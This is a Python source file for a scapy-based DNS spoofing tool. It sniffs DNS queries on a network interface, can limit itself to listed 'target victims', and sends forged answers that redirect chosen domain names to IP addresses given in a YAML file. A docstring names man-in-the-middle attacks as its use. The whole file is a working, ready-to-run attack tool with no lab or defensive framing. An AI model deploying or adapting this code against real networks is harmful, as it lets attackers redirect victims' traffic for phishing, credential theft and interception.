# Copyright 2020 @dkarthik351
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#    http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""
DNS spoofing application
"""
import os
import sys
import socket
from argparse import ArgumentParser, RawDescriptionHelpFormatter
from scapy.all import DNS, DNSQR, DNSRR, IP, send, sniff, UDP
import yaml

DNS_TTL = 255

def define_arguments():
    """
    Summary: Define arguments that this script will use.
    return: Populated argument parser
    """
    description = ("This is a DNS Spoofing application ")
    parser = ArgumentParser(description=description,
                            formatter_class=RawDescriptionHelpFormatter)
    parser.add_argument('-f', '--file', required=True,
                        help=('Input file in YAML format with website names and '
                              'corresponding IP address to be returned in DNS response'))
    parser.add_argument('-i', '--interface', required=True,
                        help=('Ethernet Interface on which to sniff DNS packets'))
    parser.add_argument('-l', '--local_ip', required=False,
                        help=('Provide local IP to prevent self-spoofing. '
                              'If not provided ip route cmd will be executed to grep local_ip'))
    parser.add_argument('-t', '--target_victims', required=False,
                        help=('List of "," separated IP addresses to target for DNS spoofing'))
    return parser.parse_args()

def get_file_content(file_name):
    """
    Summary: Function to open a file and return the contents of the file
    """
    try:
        input_args = ""
        with open(file_name, "r") as file_pointer:
            input_args = yaml.safe_load(file_pointer.read())
        return input_args
    except Exception as err:
        print(str(err))
        sys.exit("exiting.. Unable to open file %s!" % file_name)

def is_valid_ip(address):
    """
    Summary: This function validates if provided string is a valid IP address.
    """
    try:
        socket.inet_aton(address)
        return True
    except Exception:
        return False

def get_local_ip():
    """
    Summary: This function tries to obtain local ip with the help of 'ip route' cmd
             executed in the shell.
    """
    local_ip = ""
    try:
        local_ip = os.popen("ip route | grep 'src' | awk {'print $9'}").read().strip()
    except Exception:
        pass
    return local_ip

def parse_target_victims(target_victims):
    """
    Summary: This function parses and validates target_victims args.
    """
    victims_list = []
    if not target_victims:
        return victims_list
    # convert string with ',' delimeters to list
    victims_list = target_victims.split(",")
    victims_list = list(map(str.strip, victims_list))

    # Validate IPs in victims_list
    for victim_ip in victims_list:
        if not is_valid_ip(victim_ip):
            sys.exit("Provide valid IPs in target_victims!")

    return victims_list

def validate_spoofing_args(input_args):
    """
    Summary: This function checks if required key/values in input file are defined
    """
    if not input_args:
        return False
    for spoof_ip in input_args.values():
        if not spoof_ip or not is_valid_ip(spoof_ip):
            return False
    return True

def spoof_dns_response(orig_pkt, spoof_ip, iface):
    """
    Summary: This method responds to DNS Query by spoofing and can be utilized for
             Man In The Middle(MITM) attack.
    """
    print(f"Spoofing: {orig_pkt[DNSQR].qname.decode('UTF-8')}")
    try:
        # Construct DNS response with following modifications
        # qr: 1 --> response
        # ra: 1 --> recursion available
        # ancount:1 --> count of answers provided
        # an --> Spoofed DNS answer with dummy fixed ttl and IP
        dns_resp = DNS(id=orig_pkt[DNS].id, qr=1, ra=1, ancount=1,
                       qdcount=orig_pkt[DNS].qdcount, qd=orig_pkt[DNS].qd,
                       an=DNSRR(rrname=orig_pkt[DNSQR].qname, rdata=spoof_ip, ttl=DNS_TTL))
        resp_pkt = IP(dst=orig_pkt[IP].src,
                      src=orig_pkt[IP].dst)/UDP(dport=orig_pkt[UDP].sport,
                                                sport=53)/DNS()
        resp_pkt[DNS] = dns_resp

        # Sending DNS response
        send(resp_pkt, verbose=0, iface=iface)
        return f"Spoofed DNS Response Sent: {orig_pkt[IP].src}"
    except Exception as err:
        raise err

def dns_responder(iface, spoof_dict, target_victims, local_ip):
    """
    Summary: This method spoofs response to DNS Query if the query website name is
             provided in the input file. Additionaly, if target_victims are provided
             it will only spoof response for the DNS request from those target machines.
    """
    def get_response(pkt):
        resp = None
        if IP not in pkt and DNS not in pkt:
            return resp

        # Prevent self-spoofing
        if pkt[IP].src == local_ip:
            return resp

        # IF standard DNS query, zero answers and DNS query packet of type 'A'/Ipv4
        if pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0 and pkt[DNS].qd.qtype == 1:

            # Obtain DNS Query Name from DNS Request packet
            qname = pkt[DNSQR].qname.decode('UTF-8')

            # Remove '.' at end of qname if present (eg: 'www.foo.com.')
            if qname[len(qname)-1] == '.':
                qname = qname[0:(len(qname)-1)]

            # Proceed only if DNS Query Name is in spoof dictionary
            if qname not in spoof_dict.keys():
                return resp

            # If target_victims provided, check if DNS request is from target_victims
            if target_victims and str(pkt[IP].src) not in target_victims:
                return resp

            # Spoof DNS response
            resp = spoof_dns_response(pkt, spoof_dict[qname], iface)
        return resp

    return get_response

def main(args):
    """
    Summary: Main function to parse input arguments and begin scapy sniff
    """
    spoof_dict = {}
    bpf_filter = f"udp dst port 53"
    local_ip = ""
    target_victims = []

    # Interface Name for DNS sniffing
    iface = args.interface

    # Read Input File with Website Name to spoof IP map
    if args.file:
        file_contents = get_file_content(args.file)
        if validate_spoofing_args(file_contents):
            spoof_dict = file_contents
        else:
            sys.exit("Provide valid file with website name as keys and Spoof IP as values!")

    # Parse target_victims list
    if args.target_victims:
        target_victims = parse_target_victims(args.target_victims)

    # Get local IP
    if args.local_ip:
        local_ip = args.local_ip
    else:
        local_ip = get_local_ip()
    if not local_ip or not is_valid_ip(local_ip):
        sys.exit("Unable to obtain local IP. Provide a valid IP address in --local_ip argument!")

    # Continuously Sniff for packets in the mentioned network interface
    try:
        sniff(filter=bpf_filter,
              prn=dns_responder(iface, spoof_dict, target_victims, local_ip),
              iface=iface)
    except Exception as err:
        raise err

if __name__ == "__main__":
    # Define Input Arguments
    ARGS = define_arguments()
    main(ARGS)
